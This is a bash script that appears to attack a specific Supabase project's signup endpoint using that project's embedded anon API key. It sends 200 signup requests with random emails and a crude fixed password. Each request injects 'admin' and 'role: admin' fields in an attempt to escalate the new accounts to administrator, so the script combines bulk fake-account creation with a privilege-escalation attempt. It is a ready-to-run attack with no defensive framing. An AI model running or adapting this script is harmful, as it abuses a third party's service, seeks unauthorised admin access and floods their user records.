#!/usr/bin/bash

apiKey=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFteWx5dXJoYnR3ZnJqbWxweG15Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDM3OTA0NzYsImV4cCI6MjA1OTM2NjQ3Nn0.1BC9sTd9m1Ojg-1cim4nqUIp6ab5yPU41LZX7vRMV3Q

email=$(openssl rand --hex 24)
domain=$(openssl rand --hex 5)
username=$(openssl rand --hex 16)
payload='{
  "email": "'"$email"'@gmail.com",
  "password": "olebendikelskerkuk",
  "data": {
    "username": "'"$username"'",
    "admin": "true"
  },
  "gotrue_meta_security": {},
  "code_challenge": null,
  "code_challenge_method": null,
  "role": "admin"
}'



for i in $(seq 1 200); do
  curl -X POST "https://amylyurhbtwfrjmlpxmy.supabase.co/auth/v1/signup" \
    -H "apiKey: $apiKey" \
    -H "Authorization: Bearer $apiKey" \
    -H "Content-Type: application/json" \
    -d "$payload"

  printf "\n"
  sleep 60
done
